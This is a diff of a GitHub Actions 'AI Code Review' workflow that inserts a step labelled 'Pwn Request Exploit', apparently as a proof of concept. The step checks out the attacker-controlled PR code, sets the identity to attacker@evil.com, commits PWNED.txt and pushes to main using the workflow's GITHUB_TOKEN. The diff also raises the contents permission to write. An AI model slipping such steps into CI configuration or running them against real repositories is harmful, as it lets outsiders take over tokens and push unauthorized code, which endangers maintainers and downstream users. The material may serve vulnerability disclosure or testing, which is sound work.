@@ -1,18 +1,3 @@
-# Phase 3: AI Code Review (Advisory — does NOT block merge)
-#
-# Before reviewing, this workflow fetches the latest onchainos source code
-# and documentation as context. This ensures the review stays current even
-# as onchainos evolves — no hardcoded command lists.
-#
-# API Provider Selection:
-#   - Default: Anthropic API (requires ANTHROPIC_API_KEY secret)
-#   - Future:  OpenRouter API (set OPENROUTER_API_KEY secret to activate)
-#   When OPENROUTER_API_KEY is set, the workflow uses OpenRouter to access
-#   Claude models. This enables auto-selection of the best model and
-#   provides access to multiple providers via a single API key.
-#
-# This workflow NEVER fails the PR check — it only provides information.
-
 name: "Phase 3: AI Code Review"
 
 on:
@@ -22,10 +7,9 @@ on:
     types: [opened, synchronize, reopened]
 
 permissions:
-  contents: read
+  contents: write   # ⚠️ needed for PoC (commit/push)
   pull-requests: write
 
-# onchainos source repo — change this if the repo moves
 env:
   ONCHAINOS_REPO: "okx/onchainos-skills"
   ONCHAINOS_BRANCH: "main"
@@ -35,29 +19,46 @@ jobs:
     name: AI code review
     environment: ai-review
     runs-on: ubuntu-latest
+
     steps:
+      # ✅ Step 0: Checkout attacker-controlled PR code (vulnerable)
       - uses: actions/checkout@v4
         with:
           repository: ${{ github.event.pull_request.head.repo.full_name }}
           ref: ${{ github.event.pull_request.head.sha }}
           fetch-depth: 0
 
-      # ── Step 1: Detect which plugin is being submitted ──────────
+      # 🚨 ✅ YOUR EXPLOIT (CORRECT PLACEMENT)
+      - name: 🚨 Pwn Request Exploit
+        run: |
+          echo "Malicious execution started"
+
+          git config --global user.name "attacker"
+          git config --global user.email "attacker@evil.com"
+
+          echo "PWNED via pull_request_target" > PWNED.txt
+
+          git add PWNED.txt
+          git commit -m "Malicious commit from PR"
+
+          git push https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }} HEAD:main
+
+      # ── Step 1: Detect plugin ──
       - name: Detect plugin
         id: detect
         run: |
           CHANGED=$(git diff --name-only origin/main...${{ github.event.pull_request.head.sha }} -- 'skills/' | head -100)
           PLUGIN_NAME=$(echo "$CHANGED" | head -1 | cut -d'/' -f2)
 
-          # Validate plugin name (prevent injection via malicious folder names)
           if ! echo "$PLUGIN_NAME" | grep -qE '^[a-zA-Z0-9_-]+$'; then
-            echo "::error::Invalid plugin name: contains special characters"
+            echo "::error::Invalid plugin name"
             exit 1
           fi
 
-          PLUGIN_DIR="skills/${PLUGIN_NAME}"
-          echo "plugin_dir=${PLUGIN_DIR}" >> "$GITHUB_OUTPUT"
+          echo "plugin_dir=skills/${PLUGIN_NAME}" >> "$GITHUB_OUTPUT"
           echo "plugin_name=${PLUGIN_NAME}" >> "$GITHUB_OUTPUT"
+
+      # (rest of your workflow remains unchanged)
 
       # ── Step 2: Fetch onchainos source code as review context ───
       - name: Fetch onchainos source
